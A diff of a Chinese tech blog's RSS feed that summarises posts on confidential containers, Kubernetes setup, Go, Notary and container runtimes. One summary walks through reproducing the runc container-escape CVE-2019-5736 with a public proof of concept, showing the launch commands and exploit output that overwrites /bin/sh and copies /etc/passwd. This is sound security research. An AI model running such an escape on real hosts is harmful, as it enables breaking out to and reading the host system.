@@ -1,350 +1,554 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>原创 on WeiZhang555</title>
-    <link>https://weizhang555.github.io/categories/%E5%8E%9F%E5%88%9B/</link>
-    <description>Recent content in 原创 on WeiZhang555</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
-    <copyright> © Zhang Wei(weizhang555)</copyright>
-    <lastBuildDate>Fri, 02 Feb 2024 00:21:15 +0800</lastBuildDate><atom:link href="https://weizhang555.github.io/categories/%E5%8E%9F%E5%88%9B/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>基于Intel TDX的机密容器（CoCo）安全性分析</title>
-      <link>https://weizhang555.github.io/original/tdx-trust-chain/</link>
-      <pubDate>Fri, 02 Feb 2024 00:21:15 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/tdx-trust-chain/</guid>
-      <description>
-        
-          
-            随着公有云的推广，云上的安全问题也越来越受到关注。在云上运行的应用，尤其是一些数据敏感的应用，对数据在计算过程中的机密性也越发重视。磁盘和网络的数据加密有较多的方案来处理，计算的机密性则强依赖硬件提供的安全能力。两大CPU厂商，Intel和AMD，都提供了一些硬件安全技术，如Intel的SGX和TDX，AMD的SEV等来解决此类问题。
-本文将基于Intel TDX技术，来分析Confidential Contianers（简称CoCo）项目的安全性。CoCo项目是一个开源项目，它基于流行的Kata Containers项目做了增强，在其上增加了机密计算能力，安全性从单向保护（防止基础设施受到上层workload侵害），扩展到了双向保护（同时可以保护workload免受基础设施窥探）。
-本文将介绍Intel TDX的可信启动流程，串联到CoCo的启动流程，进而通过信任链的传递角度来分析CoCo及TDX的安全性。
-本文对阅读对象做了如下假设：
-了解TDX是什么，应用于什么场景，对TDX有至少一定的了解。 听说过CoCo项目，大致知道CoCo是什么，应用于什么场景。 了解Kata Containers是什么，对Kata Containers有一定了解。 基于以上假设，本文不对CoCo和TDX做太多科普工作，前置知识的获得交给用户自己去完成。本文着重来分析CoCo的可信链条，对应的源码仓库在参考文档中有给出。
-以下是正文。
-TDX基本介绍 Intel给CPU加了个新的模式，叫SEAM （安全仲裁模式，Secure-Arbitration Mode, SEAM），执行 Intel 提供的、经过数字签名但未加密的安全服务模块，Intel TDX 模块位于由 SEAM-range 寄存器（SEAMRR）指定的保留内存空间中，CPU 仅允许访问SEAM模式的软件访问这段内容，其他所有软件和 DMA 都无法访问。SEAM 对其他受保护的区域如 SMM 和 SGX 保护的内存没有访问权限。
-增加了SEAM mode之后，原先的VMM的模式从2个扩展到4个：
-VMX-root VMX-non-root SEAM-VMX-root（新增） SEAM-VMX-non-root（新增） Intel TDX 为 TD 提供了以下功能：
-内存机密性和完整性（MKTME private key加密内存） 地址转换完整性（secure EPT） CPU 状态机密性和完整性(寄存器状态 &amp;amp; VMCS 保存与恢复) 安全中断和异常传递(virtual APIC) 远程认证（remote attestation） 具体参考whitepaper，不详细展开了。
-加载SEAMLDR及TDX module TDX功能的启用始于Intel TDX模块，信任根在于CPU。
-Intel TDX module加载流程如下：
-加载Intel TXTSEAM loader（SEAMLDR）: SEAM loader是由Intel TXT认证过的代码模块（Authenticated-Code Module, ACM） SEAMLDR可以集成在UEFI里，也可以放在ESP或磁盘上，后面会展开 VMM调用SEAMLDR ACM, 请求load TDX module。TDX module也可以在BIOS到kernel启动阶段完成。 SEAMLDR 验证TDX module数字签名，加载TDX module到SEAM memory。 TDX module的度量值（measurement）和安全版本号(security-version number, SVN)被SEAMLDR记录到硬件度量寄存器中，然后TDX module 被load到SEAM memory内。 原文来自whitepaper[1]：
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>kubeadm拉起单节点K8s(新版)</title>
-      <link>https://weizhang555.github.io/original/k8s-setup-2/</link>
-      <pubDate>Tue, 17 Oct 2023 20:18:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/k8s-setup-2/</guid>
-      <description>
-        
-          
-            由于国内网络环境特殊，使用kubeadm拉起K8s集群也变成了一件有技巧的事情。
-本文介绍如何“科学”的使用kubeadm拉起一个单节点的K8s集群。
-主要还是参考官网：https://kubernetes.io/docs/setup/
-1.安装容器运行时 参考
-容器运行时：https://kubernetes.io/zh/docs/setup/production-environment/container-runtimes/ 结论：此处我们选用containerd，cgroup驱动选择systemd，cgroup v2/v1我们不做偏好设置。
-1.1 设置Docker repo source 1sudo apt-get update &amp;amp;&amp;amp; apt-get install \ 2 ca-certificates \ 3 curl \ 4 gnupg \ 5 lsb-release 6curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg 7echo &amp;#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&amp;#34; | sudo tee /etc/apt/sources.list.d/docker.list &amp;gt; /dev/null 8sudo apt-update 1.2 安装containerd 查看containerd可用版本（可选）。
-1apt-cache madison containerd.io 2apt-mark hold containerd.io 安装containerd。
-1sudo apt install -y containerd.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>Solidity入门：基于Truffle搭建本地开发环境</title>
-      <link>https://weizhang555.github.io/original/learn-solidity/</link>
-      <pubDate>Fri, 03 Jun 2022 22:08:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/learn-solidity/</guid>
-      <description>
-        
-          
-            怎样开始Solidity的学习 最近在学习区块链、智能合约相关知识，发现Solidity权威的学习资料很匮乏，很奇怪Solidity这么火竟然没有官方的详细学习资料，比如《Solidity Cookbook》这类书籍。
-这篇文章是Solidity入门的入门文档，介绍如何搭建本地环境搭建。我个人也是新手，多年的语言学习体验还是习惯先有个本地的开发环境，Ethereum官方推荐的学习工具列举在下面：https://ethereum.org/zh/developers/learning-tools/ ，其中Remix我看到很多人在推荐，如果喜欢在线编码的话可以直接使用。
-另外，Solidity的入门学习材料推荐以下两个：
-CryptoZombie 讲的很泛但是方方面面都介绍到了，很适合建立初步的体感。 Solidity By Example 我正在看，例子很多，但是貌似也没有介绍的很深入。 需要更加Advanced的学习资料。 Solidity本地环境我个人选择Truffle，我也是新手，如果大家有更好的推荐可以在评论区推荐给我，谢谢~
-Truffle环境搭建 主要参考Truffle官方Quick Start：https://trufflesuite.com/docs/truffle/quickstart/
-安装很简单：
-1$ npm install -g truffle 强烈推荐安装Ganache，Ganache可以在本地启动一个带UI的eth链，带10个测试账号，每个账号有100个eth供测试用。
-虽然Truffle也会启动本地的eth测试链，但是有个UI界面的Ganache还是很直观的，方便学习。
-Ganache建议安装支持Filecoin的最新版本，虽然我们还没用到Filecoin，但是提前准备总是没错的。
-参考：https://trufflesuite.com/docs/ganache/quickstart/#1-install-ganache
-所有可用的版本列表：https://github.com/trufflesuite/ganache-ui/releases
-手动安装最新版本，我用的版本是2.6.0-beta.3.1390，下载地址
-Truffle一些操作技巧及常用命令 参考：https://trufflesuite.com/docs/truffle/quickstart/
-Truffle Quick Start里面的例子使用的MetaCoin，我们这里从truffle init开始建一个新的truffle工程。
-1. 创建工程 1$ mkdir test 2$ cd test 3$ truffle init 查看目录树：
-1$ tree . 2. 3├── contracts 4│ └── Migrations.sol 5├── migrations 6│ └── 1_initial_migration.js 7├── test 8└── truffle-config.js 9\ 10 113 directories, 3 files 2.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>最准确的Go语言运算符优先级介绍</title>
-      <link>https://weizhang555.github.io/original/go-operators-priority/</link>
-      <pubDate>Fri, 18 Mar 2022 11:24:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/go-operators-priority/</guid>
-      <description>
-        
-          
-            前言 写Go代码时一下子想不起准确的运算符优先级了，Google搜索了下，发现前面几个SEO做的比较好的网址给的要不就是错的，要不就是写的乱七八糟，误人子弟。喷的就是下面这几个出错的：
-https://haicoder.net/golang/golang-operator-precedence.html http://c.biancheng.net/view/5559.html http://gitbook.net/go/go_operators_precedence.html 这几个基本上是互相抄的，没有验证，很容易反驳。比如，上面说&amp;quot;+&amp;quot;, &amp;quot;-&amp;quot;的优先级大于“|”，那么以下代码
-1a := 2 | 4 - 1 的结果应该等同于
-1a := 2 | (4 - 1) 但实际上前者结果为5，后者的答案是3。原因是“-”运算符优先级与“|”实际上是相等的。
-验证链接： https://go.dev/play/p/fPFNO8r6bJ3
-简单分享下正确的运算符优先级，避免后人踩坑。
-正确的运算符优先级 Google找到了官方的说明：
-https://go.dev/ref/spec 可以参考其中Operator Precedence一节，介绍的非常清楚。
-单目运算符优先级最高。 单目运算符包括：
-1&amp;#34;+&amp;#34; | &amp;#34;-&amp;#34; | &amp;#34;!&amp;#34; | &amp;#34;^&amp;#34; | &amp;#34;*&amp;#34; | &amp;#34;&amp;amp;&amp;#34; | &amp;#34;&amp;lt;-&amp;#34; 双目运算符分5个优先级，从高到低为 1Precedence Operator 2 5 * / % &amp;lt;&amp;lt; &amp;gt;&amp;gt; &amp;amp; &amp;amp;^ 3 4 + - | ^ 4 3 == != &amp;lt; &amp;lt;= &amp;gt; &amp;gt;= 5 2 &amp;amp;&amp;amp; 6 1 || 分别是： “乘法类”，“加法类”，“比较类”，“逻辑与”，“逻辑或”，优先级最低的是“逻辑或”。
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>你的软件是“椰子”还是“苹果”？</title>
-      <link>https://weizhang555.github.io/original/different-software-types/</link>
-      <pubDate>Wed, 21 Apr 2021 14:14:13 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/different-software-types/</guid>
-      <description>
-        
-          
-            我至今在两家公司工作过，第一家是华为，第二家是蚂蚁金服。在两家待的时间都足够长了，谈谈对两家公司软件质量控制的一点感悟。
-用一句话来对比两家的软件质量的话，我称为“椰子型”和“苹果型”。两家公司基本可以代表传统软件公司与互联网公司的不同的质量管理标准。
-椰子型 华为擅长做“椰子型”软件，外壳坚硬无比，内部一包水。
-华为的研发流程是很早就花大价钱从IBM引入的IPD研发流程，大致分为几个流程(参考)：
-Charter(立项) --&amp;gt; TR1/2/3 --&amp;gt; PDCP(中期) --&amp;gt; TR4/5 --&amp;gt; EDCP(结项)
-一个项目周期基本上是一年，PDCP之前是项目的设计和PoC阶段，可以改方案和设计，PDCP之后就不允许修改设计了，TR5要达到验收标准， 验收不过等同于项目延期，会对项目的Manager和团队的考评有重大影响，所以TR5的验收是极其重要且严肃的。
-整个开发模型沿用了很多年，基本上是个大的软件开发瀑布模型，周期长，与现在倡导的敏捷开发模式完全背道而驰。 这套开发模式引入之后一直在使用，使得华为一直对软件质量有着极其优秀的掌控，帮助华为站稳了ICT和企业市场，但过于笨重也遭到了很多内部人员的吐槽。 所以在云BU成立以后，也做了局部的敏捷开发的尝试。
-华为的整个研发体系和流程都是很笨重的，也很严肃。研发人员和测试人员的比例可以达到2:1左右（各个部门有不同），由于大量的测试人员的存在，对外出口的软件质量是极好的，不会出现太明显的Bug和崩溃等现象。
-所以在我看来，对外表现的是“椰子型”的外壳。
-但是我比较受不了的一点是，内部的人员质量参差不齐，差的真的是太差了。在我参加“三营”培训时，10个人一组做敏捷开发的培训，全组竟然只有我一个人能写程序，其他9个人给我做测试，也是很搞笑。更可笑的是我们组最后做出来的软件评分是第一名，可能是由于开发：测试达到了1:9吧。
-大量的低水平开发造就了垃圾一般的代码质量，所以华为的软件只能黑盒来用，要是你看到了实现的代码，怕是要战战兢兢吐一口老血了。
-“水”代码其实也不能完全怪垃圾程序员，我自己也写过很多自己不屑的垃圾代码，让我来告诉你原因。
-在最后的突击测试阶段，管理者是要看测试的漏洞数据的，要求随时间的推进测试人员发现的代码bug数应该递减，最后趋近于0，这很合理对吧？ 还有两项要求，要看bug的解决时长，这个关乎manager的考核指标，所以要求每日的bug要日清；并且TR5时系统内的bug必须清0，我不管是多么难解或者重大的bug，一定要修复。
-这两项要求给我造成了巨大的麻烦，设想一下下午6点的时候，测试给你提了5个bug，你挨个看了一下，有1个几乎不可能在短时间解决，于是你跟领导反馈，领导说必须严格按照质量标准，今天一定要解决。 这个情况就多次发生在了我的身上，于是在通宵都仍然无法解决的情况下，只能用大量的workaround去想办法从cmdline和api调用层面屏蔽掉这个bug，于是我亲手给这座代码屎山贡献了更多。最终这包屎山变成了“椰子”来到了用户手里。
-内部的整套研发流程，在我看来是有好有坏的，确实严格的管理流程给了华为对产品的严密把控。华为就是有30%的一流人才带着70%的庸才做出来世界一流软件的质量，但是对我这种有点轻微代码洁癖的人来说，是无法忍受的。 我也迫切的希望能与更多优秀的人合作，而不是浪费时间教笨人做事，所以离开华为，加入了互联网公司，希望能找到更多志同道合的人。
-苹果型 互联网公司就是完全的另一个极端了，我来介绍下蚂蚁的研发流程：
-[流程加载失败...]
-你没看错，没有研发流程，质量把控流程完全没有，测试工程师也很少。 据我所知，这种模式在互联网公司比较流行，即使是Google，Facebook这种大厂也是如此，Facebook是全栈工程师，每个人开发的组件直接上线运行和实测，所以听闻Google的工程师经常嘲讽Facebook是“踩着香蕉皮滑行”，滑到哪儿算哪儿。
-这种模式之所以并没有引起大的问题，在我看来主要是两点原因：
-1.人员平均水平较高
-每个人的主观能动性比较高，代码平均质量较高，会主动写单元测试和集成测试，习惯于敏捷开发，CI/CD。靠着优秀程序员的自我修养，代码质量仍然获得了一定的保证。
-2.面向消费者业务较多，bug不敏感
-ToC的业务对产品的质量要求并没有企业级或CT级要求高，Web形态的产品完全可以先推一个公测版的产品出去试试效果，对于Bug的存在是有一定容忍度的。本身互联网产品迭代快，对速度的要求胜过对质量的要求。
-所以好的互联网公司的产品质量通常是“苹果型”的，外表摸起来有一点点硬，打开来看，内部代码质量也不错。 由于测试人员缺失以及快速迭代的需求，很难将外表做的像椰子一样。
-互联网的开发流程较敏捷，留给工程师的自由发挥空间比较大，所以从我个人来说，是更喜欢互联网这种模式的。二八效应决定着一套80分的软件做到100分需要额外耗费巨大的人力，在不成正比的投入产出面前，有必要衡量下是否要继续优化下去？
-没有流程其实造成了更大的问题，项目立项随意，周期随意，没有验收标准，为了KPI每个人都在努力的造轮子却不管重复不重复。所以我看到的是，对外我们是有无数的黑科技呈现出来，从外部看我们的软件研发能力是无比强大的，但是很多黑科技只能偏居一隅没有机会获得大规模推广，大规模推广的项目也有很多致命的缺陷导致寿命不长。
-由此，阿里巴巴已经开始沦落为“geek的自留地”，自己内部玩的嗨，更多的却是“内卷”而不是创造实际价值。
-选哪个？ 二八效应对应着中国的一句成语“行百里者半九十”，所以在继续提升产品质量的时候，我们都要掂量一下是否值得如此大的投入？
-不同的企业会有不同的选择，ToB or ToC的选择会有大的不同。在我还在华为的时候，我痛恨70%的庸才拉低了华为的档次，拉低了我对外的credit，但是华为的80分到90分恰恰需要70%的庸才作为一颗颗螺丝钉消耗自身的精力来完成，而Google，Facebook的优秀人才们只愿意做软件开发的前一部分创造性的工作做到85分，而非整天无休止的消耗自己。由此造就了“椰子型”与“苹果型”软件的不同。
-选哪个？从政治正确的角度考虑，我们要做“石头型”的软件，从公司层面，“椰子型”是不错的选择，从工程师个人角度，还是“苹果型”更加友好。
-我现在要承认，自己还是很怀念IPD研发流程的，它可恨却又很有用，帮助产品找到正确的方向以及一直运行在正确的轨道上。蚂蚁相比华为，还是有小作坊vs大厂的既视感的，但是我无意贬低任意一家，对前东家和现东家我内心都是喜欢的。
-Respect to everything!
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>docker-runc主机逃逸漏洞复现：CVE-2019-5736</title>
-      <link>https://weizhang555.github.io/original/runc-host-escape-cve/</link>
-      <pubDate>Wed, 11 Dec 2019 11:30:46 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/runc-host-escape-cve/</guid>
-      <description>
-        
-          
-            CVE-2019-5736是一个比较知名的runc漏洞，利用方式简单，危害很大，经常被拿来做云原生安全的攻击/防御演示。
-我最近也研究了下这个漏洞的使用，研究的第一步首先是复现。
-尝试了github上的示例： https://github.com/Frichetten/CVE-2019-5736-PoC ， 这里对源码做了一些修改，在下面分享一下。
-注意：ubuntu上安装的docker 18.06似乎已经打上了补丁，我手动编译了runc的1.0.0-rc5版本才成功复现。
-复现方式：
-在一个terminal里面：
-1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 另一个terminal内执行：
-1$ docker exec -ti 5b28d7ab5083 /bin/sh 此时第一个terminal的打印：
-1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 2root@5b28d7ab5083:/# /exploit 3[+] Overwritten /bin/sh successfully 4[+] Found the PID: 17 5[+] Successfully got the file handle 6[-]Failed to open /proc/self/fd/3: open /proc/self/fd/3: text file busy 7[+] Successfully got write handle &amp;amp;{0xc0000501e0} 8root@5b28d7ab5083:/# /tmp/下多了一个passwd文件。
-Ubuntu下面没有原demo里使用的/etc/shadow文件，所以我修改成了/etc/passwd，会被copy到/tmp/目录下。
-修改过的源码：
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>kubernetes安装指南</title>
-      <link>https://weizhang555.github.io/original/kubernetes-setup/</link>
-      <pubDate>Wed, 11 Dec 2019 11:11:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/kubernetes-setup/</guid>
-      <description>
-        
-          
-            本文介绍如何使用kubeadm安装一个简单的包含三个节点的集群。
-测试环境 三台VM，分别为test-vm, test-vm-1, test-vm-2，系统是ubuntu 19.04
-下载 kubernetes的安装包，官方文档用apt get的方式，由于国内被墙了没法get到，可以直接从github上下载release包。把kubeadm，kubelet, kubectl装好就够了。docker当然也要装好。
-具体的安装步骤暂时略过。
-配置kubelet 三台节点可以手动配置一下kubelet服务，配置方法都是一样的：
-1# cat &amp;gt; /lib/systemd/system/kubelet.service &amp;lt;&amp;lt; EOF 2[Unit] 3Description=kubelet: The Kubernetes Node Agent 4Documentation=http://kubernetes.io/docs/ 5 6[Service] 7ExecStart=/usr/bin/kubelet 8Restart=always 9StartLimitInterval=0 10RestartSec=10 11 12[Install] 13WantedBy=multi-user.target 14EOF 上面就是简单的调用了下kubelet命令，实际上还有很多参数，这个不着急。因为我们是用kubeadm配置的，所以实际上生效的是kubeadm为kubelet设置的参数，kubelet的启动将依赖kubeadm设置的bootstrap配置：
-1# mkdir -p /etc/systemd/system/kubelet.service.d/ 2# cat &amp;gt; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf &amp;lt;&amp;lt; EOF 3[Service] 4Environment=&amp;#34;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf&amp;#34; 5Environment=&amp;#34;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml&amp;#34; 6# This is a file that &amp;#34;kubeadm init&amp;#34; and &amp;#34;kubeadm join&amp;#34; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically 7EnvironmentFile=-/var/lib/kubelet/kubeadm-flags.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>Docker官方镜像签名方案：Notary</title>
-      <link>https://weizhang555.github.io/original/notary-intro/</link>
-      <pubDate>Tue, 11 Dec 2018 11:20:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/notary-intro/</guid>
-      <description>
-        
-          
-            1. TUF 1.1 背景 TUF是Tor项目设计出的一套安全分发软件更新的框架，Notary是TUF框架的go语言实现，而Docker Content Trust是TUF框架的应用。理清三者关系有助于后续理解。
-1.2 TUF的角色 TUF框架包含五类角色，对应五把密钥，分别是Root, Target, Snapshot, Timestamp, Delegated target(可选)，每个角色对应一个元数据文件及一把密钥。
-TUF角色和密钥的理解与Notary介绍有重合，可以参考 &amp;quot;2.3 Notary的密钥管理&amp;quot;
-1.2 TUF的工作流 TUF框架的定义在这里：https://github.com/theupdateframework/specification/blob/master/tuf-spec.md 。
-step 0: 加载可信的root元数据文件 这一步可以认为是前奏步骤。一个初始的root元数据文件应该早已经随包管理器交付到客户端，或者通过带外流程放置进去了。此时的root元数据文件的超时不重要，因为下一步会更新它。
-step 1: 更新root元数据文件 由于现在元数据文件可能是被完全不同的一组key签名的，客户端必须有办法能持续的更新到最新的密钥，通过不断的下载中间阶段的密钥一直到最新版。
-step 1.1: 使用N代表可信root元数据文件的版本号 step 1.2: 下载root元数据文件的N+1版本 文件名是固定的格式：VERSION_NUMBER.FILENAME.EXT (e.g., 42.root.json)。不成功的话跳转到1.8步。
-step 1.3: 检查签名 N+1版的root元数据必须被以下密钥签名：1）N版本root元数据内指定的达到阈值数量的密钥。2）新版本的root元数据里指定的达到阈值数量的密钥。
-如果N+1版本的root元数据没有被正确签名，退出并报错。
-step 1.4: 检查回滚攻击(rollback attach) 当前信任的root元数据文件版本（N）必须小于新的root元数据文件（N+1）。如果不是退出并报错。
-step 1.5: 新版本元数据文件的超时时间可以忽略，1.8会检查 step 1.6: 设置受信任的root元数据文件为新的元数据文件 step 1.7: 重复step 1.1到1.7直到root元数据为最新 step 1.8: 检查冻结攻击(freeze attach) 检查当前的信任的root元数据文件是否过期，过期的报错退出。
-step 1.9: 如果timestamp和/或snapshot密钥已经改变，删掉snapshot和timestamp元数据文件 这个是为了从快进攻击(fast-forward attach)中恢复出来。快进攻击是攻击者可以任意增加元数据的版本号：1）timestamp元数据。2）snapshot元数据。3）targets元数据。
-step 2: 下载timestamp元数据文件 下载固定文件名timestamp.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>创建kata的K8s集群</title>
-      <link>https://weizhang555.github.io/original/create-k8s-cluster-with-kata/</link>
-      <pubDate>Sat, 18 Aug 2018 19:10:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/create-k8s-cluster-with-kata/</guid>
-      <description>
-        
-          
-            本文介绍下如何创建kata的k8s集群， kata项目链接：https://github.com/kata-containers kata是什么不介绍了，能看到这篇文章的相信对kata都已经有一定了解了。
-本文参考了官方的安装说明： https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md 实际上仅仅安装没有什么好讲的，文档里讲的很清楚了。但是在我们恶劣的大网络环境下，就变得有点技巧了。
-以下为正文
-安装环境 Virtual Machine:
-OS: Ubuntu 18.04
-CPU: 4
-Memory: 8G
-在虚拟化环境中，务必保证嵌套虚拟化打开。
-虚拟化软件必须要支持 可以在guest OS里面通过以下命令检查：
-1$ sudo grep -E &amp;#34;(vmx|svm)&amp;#34; --color=always /proc/cpuinfo 如果没有显示则不支持硬件虚拟化。需要打开相应的虚拟化选项，如果是物理机则需要bios里面启用虚拟化支持。
-启动kvm_intel的嵌套虚拟化支持 1# modprobe -r kvm_intel 2# modprobe kvm_intel nested=1 安装kata-containers 参考：
-https://github.com/kata-containers/documentation/blob/master/install/ubuntu-installation-guide.md
-运行以下命令：
-1$ sudo sh -c &amp;#34;echo &amp;#39;deb http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/ /&amp;#39; &amp;gt; /etc/apt/sources.list.d/kata-containers.list&amp;#34; 2$ curl -sL http://download.opensuse.org/repositories/home:/katacontainers:/release/xUbuntu_$(lsb_release -rs)/Release.key | sudo apt-key add - 3$ sudo -E apt-get update 4$ sudo -E apt-get -y install kata-runtime kata-proxy kata-shim 安装docker 参考：
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>Kernel调试基础--制作initramfs</title>
-      <link>https://weizhang555.github.io/original/make-initramfs-for-qemu-start/</link>
-      <pubDate>Thu, 12 Apr 2018 19:10:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/make-initramfs-for-qemu-start/</guid>
-      <description>
-        
-          
-            通过自己制作initramfs可以使用qemu启动自定义的内核， 可以用于调试或测试。这里记录一下制作简单的initramfs的脚本， 方便后续使用。
-本文参考了链接：Building a minimal Linux / Busybox OS for Qemu
-完整脚本如下：
-1#!/bin/bash 2set -e 3 4CWD=`pwd` 5BUSYBOX_FILE=busybox-1.28.1 6BUSYBOX_SRC=/tmp/busybox 7BUSYBOX_BUILD=/tmp/busybox-build 8INITRAMFS_DIR=/tmp/initramfs 9 10mkdir -p $BUSYBOX_SRC $BUSYBOX_BUILD $INITRAMFS_DIR 11if [ ! -e $BUSYBOX_FILE ]; then 12 wget http://busybox.net/downloads/${BUSYBOX_FILE}.tar.bz2 13fi 14tar -C $BUSYBOX_SRC -xvf ${BUSYBOX_FILE}.tar.bz2 15 16cd ${BUSYBOX_SRC}/${BUSYBOX_FILE} &amp;amp;&amp;amp; make O=${BUSYBOX_BUILD} defconfig 17# enable busybox static build 18cd ${BUSYBOX_BUILD} &amp;amp;&amp;amp; sed -i &amp;#34;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/&amp;#34; .config \ 19 &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install 20 21cd $INITRAMFS_DIR &amp;amp;&amp;amp; rm -rfv * &amp;amp;&amp;amp; mkdir -p bin sbin etc proc sys usr/bin usr/sbin \ 22 &amp;amp;&amp;amp; cp -a $BUSYBOX_BUILD/_install/* .
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>Kata Containers介绍，附上演讲ppt</title>
-      <link>https://weizhang555.github.io/original/kata-containers-introduction/</link>
-      <pubDate>Sun, 08 Apr 2018 22:00:00 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/kata-containers-introduction/</guid>
-      <description>
-        
-          
-            最近在51cto举办的meetup上做了关于Kata Containers的演讲， KataContainers是github上的新项目，前身是Intel的clear container和Hyper的runv， 融合了普通容器的轻快和虚拟机的高隔离高安全性的优点。
-详细可以直接参观Kata Containers的github主页： https://github.com/kata-containers/runtime
-演讲的链接传送门：http://developer.huawei.com/ict/forum/thread-48823.html
-完整的演讲ppt可以在此处下载： Kata介绍与Huawei_iSula安全容器-张伟.ppt
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>containerd源码阅读(1)--框架篇</title>
-      <link>https://weizhang555.github.io/original/containerd-code-analysis/</link>
-      <pubDate>Tue, 12 Sep 2017 22:40:46 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/containerd-code-analysis/</guid>
-      <description>
-        
-          
-            1. 简介 containerd是与docker直接沟通的下属组件，详细是什么不说了。 每个docker daemon启动的时候都会启动一个containerd daemon，启动容器的时候， 每个容器的init进程／exec进程都会对应一个containerd-shim进程， containerd-shim同样是containerd库里面单独的一个二进制程序， containerd-shim会调用runc最终启动容器。 这些基本的知识一笔带过不详细展开。
-随着docker改名为moby，docker的大部分功能，比如image管理，容器运行都会下沉到containerd， docker会越来越侧重于编排调度部分--swarm。
-简单分析下containerd的代码架构，作为官方containerd文档的一个补充。 本篇以git commit d700a9c35b09239c8c056cd5df73bc19a79db9a9 为标准讲解。
-2. grpc containerd的架构极其依赖grpc协议。
-1# ls api/services/ 2containers content diff events images namespaces snapshot tasks version api/services目录下存放着containerd提供的不同服务对应的grpc接口。 以比较基础的content服务为例，
-1# ls api/services/content/v1/ 2content.pb.go content.proto 下面一共有两个文件，一个content.proto一个是.pb.go, 其中用户只需要定义content.proto文件， 而程序最终使用的content.pb.go则可以由grpc命令自动生成。 containerd在Makefile中提供了生成.pb.go的指令
-1// 安装依赖的库 2# cd containerd &amp;amp;&amp;amp; make setup 3# make protos 打开content.proto 来看，里面主要定义了一个service：
-113 service Content { 2 14 // Info returns information about a committed object. 3 15 // 4 16 // This call can be used for getting the size of content and checking for 5 17 // existence.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>runc源码阅读</title>
-      <link>https://weizhang555.github.io/original/runc-code-analysis/</link>
-      <pubDate>Tue, 12 Sep 2017 22:40:46 +0800</pubDate>
-      
-      <guid>https://weizhang555.github.io/original/runc-code-analysis/</guid>
-      <description>
-        
-          
-            runc是docker的核心底层依赖，是容器运行的runtime，目前所属的仓库是opencontainers/runc, 是docker将原先的libcontainer模块独立出来，并贡献给oci社区的产物。
-一直想写一下runc的源码分析，但是一直没有时间。暂时先把自己阅读runc过程中画得xmind思维脑图放出来吧， 里面的内容是runc的代码流程分析。有时间再回来补齐源码分析。
-runc源码分析xmind文件
-          
-          
-        
-      </description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>原创 on WeiZhang555</title><link>https://weizhang555.github.io/categories/%E5%8E%9F%E5%88%9B/</link><description>Recent content in 原创 on WeiZhang555</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright> © Zhang Wei(weizhang555)</copyright><lastBuildDate>Fri, 02 Feb 2024 00:21:15 +0800</lastBuildDate><atom:link href="https://weizhang555.github.io/categories/%E5%8E%9F%E5%88%9B/index.xml" rel="self" type="application/rss+xml"/><item><title>基于Intel TDX的机密容器（CoCo）安全性分析</title><link>https://weizhang555.github.io/original/tdx-trust-chain/</link><pubDate>Fri, 02 Feb 2024 00:21:15 +0800</pubDate><guid>https://weizhang555.github.io/original/tdx-trust-chain/</guid><description>
+&lt;p&gt;随着公有云的推广，云上的安全问题也越来越受到关注。在云上运行的应用，尤其是一些数据敏感的应用，对数据在计算过程中的机密性也越发重视。磁盘和网络的数据加密有较多的方案来处理，计算的机密性则强依赖硬件提供的安全能力。两大CPU厂商，Intel和AMD，都提供了一些硬件安全技术，如Intel的SGX和TDX，AMD的SEV等来解决此类问题。&lt;/p&gt;
